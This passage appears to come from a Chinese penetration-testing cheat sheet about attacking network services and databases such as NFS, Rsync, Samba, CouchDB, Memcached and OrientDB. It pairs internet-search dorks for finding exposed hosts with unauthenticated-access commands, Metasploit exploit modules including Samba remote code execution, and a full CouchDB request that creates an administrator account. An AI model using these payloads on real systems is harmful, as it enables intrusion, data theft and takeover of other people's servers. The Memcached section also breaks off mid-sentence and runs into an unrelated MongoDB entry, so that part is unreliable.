**CVE-1999-0554 目标主机 showmount -e 信息泄露**
- POC | Payload | exp
    ```bash
    showmount -e 
    mount -t nfs :/opt/applications/xxx_static_data  /mnt
    ```
- MSF 模块
    ```bash
    use auxiliary/scanner/nfs/nfsmount
    set rhosts 
    run
    ```
---
### Rsync
> fofa : app="rsync"
**未授权访问**
- 相关文章
    - [rsync的几则tips(渗透技巧)](http://www.91ri.org/11093.html)
    - [配置漏洞之Rsync匿名访问](https://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BRsync%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE.html)
- POC | Payload | exp
    ```bash
    apt install rsync -y
    rsync ::
    ```
    - [rsync 未授权访问漏洞](https://github.com/vulhub/vulhub/tree/master/rsync/common)
- MSF 模块
    ```bash
    use auxiliary/scanner/rsync/modules_list
    set rhosts 
    run
    ```
---
### Samba
Samba 是 Samba 团队开发的一套可使 UNIX 系列的操作系统与微软 Windows 操作系统的 SMB/CIFS 网络协议做连结的自由软件，它支持共享打印机、互相传输资料文件等。
**CVE-2015-0240**
- 描述
    Samba 的 smbd 文件服务器守护进程中的 Netlogon 服务器实现过程中存在安全漏洞，该漏洞源于程序对未初始化的栈指针执行释放操作。远程攻击者可借助特制的 Netlogon 数据包利用该漏洞执行任意代码。以下版本受到影响：Samba 3.5.x 版本和 3.6.25 之前的 3.6.x 版本，4.0.25 之前的 4.0.x 版本，4.1.17 之前的 4.1.x 版本，4.2.0rc5 之前的 4.2.x 版本。
- 相关文章
    - [Samba CVE-2015-0240 远程代码执行漏洞利用实践](https://www.secpulse.com/archives/5975.html)
- MSF 模块
    ```bash
    use auxiliary/scanner/smb/smb_uninit_cred
    set rhosts [ip]
    run
    ```
**CVE-2017-7494**
- 描述
    Samba 允许连接一个远程的命名管道,并且在连接前会调用 `is_known_pipename()` 函数验证管道名称是否合法.在 `is_known_pipename()` 函数中,并没有检查管道名称中的特殊字符,加载了使用该名称的动态链接库.导致攻击者可以构造一个恶意的动态链接库文件,执行任意代码.
    该漏洞要求的利用条件:
    - 拥有共享文件写入权限,如:匿名可写等
    - 需要知道共享目录的物理路径
- 影响版本
    - Samba:4.6.5:::
    - Samba:4.6.3:::
    - Samba:4.6.2:::
    - Samba:4.6.1:::
    - Samba:4.6.0:::
- 相关文章
    - [Linux cve-2017-7494samba远程漏洞利用和分析](https://bbs.pediy.com/thread-218114.htm)
    - [Samba 远程命令执行漏洞(CVE-2017-7494)](https://vulhub.org/#/environments/samba/CVE-2017-7494/)
- POC | Payload | exp
    - [joxeankoret/CVE-2017-7494](https://github.com/joxeankoret/CVE-2017-7494)
    - [opsxcq/exploit-CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494)
- MSF 模块
    ```bash
    use exploit/linux/samba/is_known_pipename
    set rhost [ip]
    set target 3
    run
    ```
---
# 数据库
**相关文章**
- [数据库利用 看这篇就好了](https://mp.weixin.qq.com/s/VgXOXVl-Bx2Vi8BYxdx3CA)
**相关工具**
- [SafeGroceryStore/MDUT](https://github.com/SafeGroceryStore/MDUT) - 数据库跨平台利用工具
    - https://www.yuque.com/u21224612/nezuig/ays2ai
- [Ryze-T/Sylas](https://github.com/Ryze-T/Sylas) - 数据库综合利用工具
    - https://paper.seebug.org/1836/
### CouchDB
Apache CouchDB 是一个开源数据库，专注于易用性和成为"完全拥抱 web 的数据库"。它是一个使用JSON作为存储格式，JavaScript 作为查询语言，MapReduce 和 HTTP 作为 API 的 NoSQL 数据库。应用广泛，如 BBC 用在其动态内容展示平台，Credit Suisse 用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web 和应用程序）.
> shodan : "product:CouchDB"
> fofa ： app="APACHE-CouchDB"
**未授权访问漏洞**
- 描述
    默认会在 5984 端口开放 Restful 的 API 接口，如果使用 SSL 的话就会监听在 6984 端口，用于数据库的管理功能。其 HTTP Server 默认开启时没有进行验证，而且绑定在 0.0.0.0，所有用户均可通过 API 访问导致未授权访问。
    在官方配置文档中对 HTTP Server 的配置有 WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生。
- 利用
    `http://[ip]:5984/_utils/`
    `curl http://[ip]:5984`
    `curl http://[ip]:5984/_config`
**CVE-2017-12635 垂直权限绕过漏洞**
- 描述
    CVE-2017-12635 是由于 Erlang 和 JavaScript 对 JSON 解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。
- 影响版本
    - 小于 1.7.0 以及 小于 2.1.1
- POC | Payload | exp
    来源 : [Couchdb 垂直权限绕过漏洞（CVE-2017-12635）](https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12635/README.md)
    ```
    PUT /_users/org.couchdb.user:vulhub HTTP/1.1
    Host: your-ip:5984
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/json
    Content-Length: 108
    {
    "type": "user",
    "name": "vulhub",
    "roles": ["_admin"],
    "roles": [],
    "password": "vulhub"
    }
    ```
**CVE-2017-12636 任意命令执行漏洞**
- 描述
    CVE-2017-12636 是一个任意命令执行漏洞，我们可以通过 config api 修改 couchdb 的配置 query_server，这个配置项在设计、执行 view 的时候将被运行。
- 影响版本
    - 小于 1.7.0 以及 小于 2.1.1
- POC | Payload | exp
    - [Couchdb 任意命令执行漏洞（CVE-2017-12636）](https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/README.md)
### InfluxDB
InfluxDB 是一个使用 Go 语言编写的开源分布式，支持高并发的时序数据库
> fofa : app="influxdata-InfluxDB"
> fofa : app="InfluxDB-2.0"
**未授权访问漏洞**
- 相关文章
    - [InfluxDB API 未授权访问漏洞简单利用](https://landgrey.me/influxdb-api-unauthorized-exploit/)
    - [influxdb未授权访问漏洞](https://blog.csdn.net/weixin_43416469/article/details/113843301)
- POC | Payload | exp
    ```
    /debug/vars
    /debug/requests?seconds=10
    /ping 用来检查数据库实例状态和版本号
    /query 用来查询数据库数据
    /write 用来更改数据库数据
    ```
---
### memcached
`Memcached 是一套常用的 key-value 分布式高速缓存系统`
> shodan: "product:Memcached"
> fofa: app="MEMCACHED"
**相关文章**
- [针对Memcached缓存服务器的渗透测试方法介绍](https://www.freebuf.com/articles/web/201086.html)
**未授权访问漏洞**
- 描述
    由于 Memcached 的安全设计缺陷没有权限控制模块，所以对公网开放的 Memcache 服务很容易被攻击者扫描发现，攻击者无需认证通过命令交互可直接读取 Memcached 中的敏感信息。
- POC | Payload | exp
    `telnet [ip] 11211`
    `nc -vv [ip] 11211`
    ```bash
    version         # 检查 Memcached Server 的当前版本
    stats           # 查看 memcache 服务状态
    stats slabs     # 获取 slab 统计信息
    stats items     # 显示各个 slab 中 item 的数目和存储时长
    set aaa 0 10 9  # 存个 aaa 值
    # flag → 0  (可以包括键值对的整型参数，客户机使用它存储关于键值对的额外信息)
    # exptime → 10 (以秒为单位)
    # bytes → 9 (数据存储的字节数)
    memcached
    get aaa         # 读这个值
    ```
- MSF 模块
    ```
    use auxiliary/gather/memcached_extractor
    ```
**CVE-2016-8704 & CVE-2016-8705 & CVE-2016-8706**
- 描述
    Memcached 是一个分布式的高速缓存系统，近日研究者发现在其  fofa: app="MongoDB-数据库"
**未授权访问**
```
nmap -p 27017 --script mongodb-info x.x.x.x
```
---
### Mysql
- [Mysql](./实验/Mysql.md)
---
### Oracle
- [Oracle](./实验/Oracle.md)
---
### OrientDB
OrientDB 是英国 Orient 公司一套开源的 NoSQL 数据库管理系统。该系统支持 ACID 事务、快速索引和 SQL 查询等功能。
> fofa : app="OrientDB"
**CVE-2017-11467**
- 描述
    OrientDB 2.22 及之前的版本中存在安全漏洞，该漏洞源于程序没有强制执行权限请求。远程攻击者可通过发送特制的请求利用该漏洞执行任意的操作系统命令。
- 相关文章
    - [OrientDB远程代码执行漏洞POC分析以及复现|CVE-2017-11467](https://bbs.ichunqiu.com/thread-33175-1-18.html)
- POC | Payload | exp
    - [OrientDB - Code Execution](https://www.exploit-db.com/exploits/44068)
---
### PostgreSQL
- [PostgreSQL](./实验/PostgreSQL.md)
---
### Redis
- [Redis](./实验/Redis.md)
---
### Sqlite
**CVE-2022-35737**
- 相关文章
    - [Stranger Strings: An exploitable flaw in SQLite](https://blog.trailofbits.com/2022/10/25/sqlite-vulnerability-july-2022-library-api/)
---
## 容器 & 虚拟化
**相关文章**
- [云原生服务风险测绘分析（一）：Docker和Kubernetes](https://mp.weixin.qq.com/s/dfa2zS8WbD2Pa4IxSxV9CA)
- [An attempt to understand container runtime](https://sidb.in/posts/intro-to-container-runtime/)
**相关工具**
- [cdk-team/CDK](https://github.com/cdk-team/CDK) - 为容器环境定制的渗透测试工具，在已攻陷的容器内部提供零依赖的常用命令及 PoC/EXP。集成 Docker/K8s 场景特有的 逃逸、横向移动、持久化利用方式，插件化管理。
- [stealthcopter/deepce](https://github.com/stealthcopter/deepce) - Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
**开源靶场/部署工具**